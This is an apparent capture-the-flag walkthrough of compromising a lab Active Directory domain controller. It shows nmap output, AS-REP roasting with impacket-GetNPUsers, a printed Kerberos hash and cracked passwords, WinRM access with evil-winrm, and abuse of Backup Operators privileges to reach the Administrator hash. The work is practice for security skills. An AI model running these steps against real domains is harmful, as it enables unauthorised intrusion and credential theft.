```Bash
Discovered open port 139/tcp on 10.201.97.101
Discovered open port 80/tcp on 10.201.97.101
Discovered open port 445/tcp on 10.201.97.101
Discovered open port 3389/tcp on 10.201.97.101
Discovered open port 53/tcp on 10.201.97.101
Discovered open port 135/tcp on 10.201.97.101
Discovered open port 49669/tcp on 10.201.97.101
Discovered open port 3269/tcp on 10.201.97.101
Discovered open port 636/tcp on 10.201.97.101
Discovered open port 593/tcp on 10.201.97.101
Discovered open port 49668/tcp on 10.201.97.101
Discovered open port 49671/tcp on 10.201.97.101
Discovered open port 49691/tcp on 10.201.97.101
Discovered open port 88/tcp on 10.201.97.101
SYN Stealth Scan Timing: About 35.36% done; ETC: 22:54 (0:00:57 remaining)
Discovered open port 49667/tcp on 10.201.97.101
Discovered open port 389/tcp on 10.201.97.101
Discovered open port 464/tcp on 10.201.97.101
Discovered open port 9389/tcp on 10.201.97.101
Discovered open port 49670/tcp on 10.201.97.101
Discovered open port 3268/tcp on 10.201.97.101
Discovered open port 49703/tcp on 10.201.97.101
Completed SYN Stealth Scan at 22:54, 87.86s elapsed (65535 total ports)
Initiating Service scan at 22:54
Scanning 21 services on 10.201.97.101
Completed Service scan at 22:55, 59.04s elapsed (21 services on 1 host)
Initiating OS detection (try #1) against 10.201.97.101
Retrying OS detection (try #2) against 10.201.97.101
Initiating Traceroute at 22:55
Completed Traceroute at 22:55, 3.01s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 22:55
Completed Parallel DNS resolution of 2 hosts. at 22:55, 0.04s elapsed
NSE: Script scanning 10.201.97.101.
Initiating NSE at 22:55
Completed NSE at 22:56, 40.11s elapsed
Initiating NSE at 22:56
Completed NSE at 22:56, 10.46s elapsed
Initiating NSE at 22:56
Completed NSE at 22:56, 0.00s elapsed
Nmap scan report for 10.201.97.101
Host is up (0.30s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: eBusiness Bootstrap Template
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-15 02:54:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Issuer: commonName=Fusion-DC.fusion.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-14T02:53:00
| Not valid after:  2026-02-13T02:53:00
| MD5:   94cd:f37e:e3d4:67e8:1ff0:c2d6:bd7d:ff8f
|_SHA-1: 4fd1:2180:5b33:e927:445e:1c1d:00a9:ce55:5de4:97e9
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-15T02:55:56+00:00
|_ssl-date: 2025-08-15T02:56:35+00:00; -1s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
I found this subdomain:
```Bash
/backup
```
And we found employee.ods. So, open it. We have username for the next attack
```Bash
impacket-GetNPUsers fusion.corp/ -dc-ip $target -usersfile user.txt -format hashcat -outputfile hashes.txt
```
```Bash
$krb5asrep$23$lparker@FUSION.CORP:19cb5448f9087e3626823098b5da5e7b$a958a800890da66650a1a898b393378ad16c66946fd79091fc412f8fda32510f1c131cb20ab3cc97601b4becd33a164aa7406a813ab15ce4481b1d6352769ccca7ea47bb0595da0d995df8648c75eddc8e68764d5133bd5b74bb10ed15c61fa60aabbdcec4356d5c9e7b0418749a2bee57edf127644d41cdff2798204825e29c8e19dab0fe54e362f6478d72cf52e91a35b4fc1a4927006024dc3d8efdb05b52594f76323ad635e3e138b04aa974038855a6a33731250a4f6fdfa1c8a0e1163332242620df360faf905717f2b7a2ddeab6a8e2a2ea7a3eb4700aa5ca46047dd5f2076aa37bbd6f254579
```
```Bash
lparker:!!abbylvzsvs2k6!
```
SID:
```Bash
500: FUSION\Administrator (SidTypeUser)
501: FUSION\Guest (SidTypeUser)
502: FUSION\krbtgt (SidTypeUser)
1000: FUSION\FUSION-DC$ (SidTypeUser)
1103: FUSION\lparker (SidTypeUser)
1104: FUSION\jmurphy (SidTypeUser)
```
Tried with evil-winrm, boom:
```Bash
C:\Users\lparker\Documents> Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, Description
```
```Bash
SamAccountName Description
-------------- -----------
Administrator  Built-in account for administering the computer/domain
Guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
lparker
jmurphy        Password set to u8WC3!kLsgw=\#bRY
```
Or tried with netexec --users, we have same answer
```Bash
WINRM       10.201.119.198  5985   FUSION-DC        [+] fusion.corp\jmurphy:u8WC3!kLsgw=\#bRY (Pwn3d!
```
So, winrm is enable. Use evil-winrm
Oh, we have backup permission
```Bash
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
```
Done, I have hash Administrator